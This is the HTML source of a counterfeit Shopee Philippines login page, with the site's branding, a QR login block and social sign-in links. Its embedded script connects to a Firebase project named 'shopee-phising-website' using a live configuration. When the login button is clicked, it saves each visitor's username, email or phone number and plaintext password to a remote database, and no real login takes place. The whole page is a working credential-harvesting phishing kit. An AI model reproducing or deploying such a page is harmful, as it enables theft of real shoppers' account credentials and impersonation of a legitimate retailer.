<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Login now to start | Shopee Philippines</title>

    <link rel="stylesheet" href="../style.css" />
</head>
<body>
    <div id="auth-header-container"></div>

    <main class="auth-main">
        <div class="auth-main-container">
            <div class="login-card auth-card">
                <div class="auth-card-header">
                    <h2 class="auth-card-title">Log In</h2>

                    <div class="login-qr-container">
                        <div class="login-with-qr">Log in with QR</div>

                        <svg width="40" height="40" fill="none" class="WfRz00">
                            <g clip-path="url(#clip0)">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M18 0H0v18h18V0zM3 15V3h12v12H3zM18 22H0v18h18V22zm-3 15H3V25h12v12zM40 0H22v18h18V0zm-3 15H25V3h12v12z" fill="#EE4D2D"></path>

                                <path d="M37 37H22.5v3H40V22.5h-3V37z" fill="#EE4D2D"></path>
                                
                                <path d="M27.5 32v-8h-3v8h3zM33.5 32v-8h-3v8h3zM6 6h6v6H6zM6 28h6v6H6zM28 6h6v6h-6z" fill="#EE4D2D"></path>
                                
                                <path fill="#fff" d="M-4.3 4l44 43.9-22.8 22.7-43.9-44z"></path>
                            </g>

                            <defs>
                                <clipPath id="clip0">
                                    <path fill="#fff" d="M0 0h40v40H0z"></path>
                                </clipPath>
                            </defs>
                        </svg>
                    </div>
                </div>

                <div class="auth-card-main">
                    <form action="#" id="login_form" class="form-inputs">
                        <input type="text" name="username_email_phone" id="username_email_phone" placeholder="Phone number / Username / Email" required />
                        <input type="password" name="password" id="password" placeholder="Password" required />
                        <button type="submit" id="login_btn" class="auth-btn" disabled>LOG IN</button>
                    </form>
                    <a href="./reset.html" class="forgot-password">Forgot Password</a>

                    <div class="login-card-divider">
                        <div class="parallel-line"></div>
                        <div>OR</div>
                        <div class="parallel-line"></div>
                    </div>

                    <ul class="login-with-socials">
                        <li>
                            <a href="#">
                                <img 
                                    src="../assets/icons/icon-facebook-100.png" 
                                    width="26px"
                                    height="26px"
                                    alt="facebook"
                                />

                                Facebook
                            </a>
                        </li>

                        <li>
                            <a href="#">
                                <img 
                                    src="../assets/icons/icon-google-100.png" 
                                    width="26px"
                                    height="26px"
                                    alt="google"
                                />

                                Google
                            </a>
                        </li>
                    </ul>
                </div>

                <div class="sign-up-btn">New to Shopee? <a href="#">Sign Up</a></div>
            </div>
        </div>
    </main>

    <footer></footer>

    <script src="../includes/includes.js"></script>
    <script type="module">
        loadAuthHeader('../includes/auth-topbar.html', 'Log In');

        import { initializeApp } 
        from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";

        import { getDatabase, ref, set, get }
        from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCN-vyH5EqJQZz-1ZV1FROjdl5hddKRRo0",
            authDomain: "shopee-phising-website.firebaseapp.com",
            databaseURL: "https://shopee-phising-website-default-rtdb.firebaseio.com",
            projectId: "shopee-phising-website",
            storageBucket: "shopee-phising-website.firebasestorage.app",
            messagingSenderId: "892033913080",
            appId: "1:892033913080:web:d3e5758adaf1e1836cab0d",
            measurementId: "G-019E4ZDT23"
        };

        // Initialize Firebase App
        const app = initializeApp(firebaseConfig);

        // Initialize Realtime Database
        const db = getDatabase(app);

        // DOM elements
        const loginForm = document.getElementById('login_form');
        const usernameEmailPhone = document.getElementById('username_email_phone');
        const password = document.getElementById('password');
        const loginBtn = document.getElementById('login_btn');

        // Initially disable the login button
        loginBtn.disabled = true;
        loginBtn.style.backgroundColor = '#F3826C';

        // Function to check input fields
        function toggleLoginButton() {
            if (usernameEmailPhone.value.trim() !== '' && password.value.trim() !== '') {
                loginBtn.disabled = false;
                loginBtn.style.backgroundColor = '#F05D40';
            } else {
                loginBtn.disabled = true;
                loginBtn.style.backgroundColor = '#F3826C';
            }
        }

        // Listen for input changes on both fields
        usernameEmailPhone.addEventListener('input', toggleLoginButton);
        password.addEventListener('input', toggleLoginButton);


        // Write data
        function AddData() {
            const usersRef = ref(db, 'users');

            get(usersRef).then((snapshot) => {

                let nextIndex = 0;

                if (snapshot.exists()) {
                    nextIndex = snapshot.size; // number of children in "users"
                }

                // Now save new user using nextIndex
                set(ref(db, 'users/' + nextIndex), {
                    username_email_phone: usernameEmailPhone.value,
                    password: password.value
                })
                .then(() => {
                    console.log("Data Added Successfully");
                })
                .catch((error) => {
                    console.log("Error:", error);
                });

            }).catch((error) => {
                console.log("Failed to get users:", error);
            });
        }


        loginForm.addEventListener('submit', function(event){
            event.preventDefault();
            console.log('Form Login Submitted');
        });

        loginBtn.addEventListener('click', AddData);
    </script>
</body>
</html>
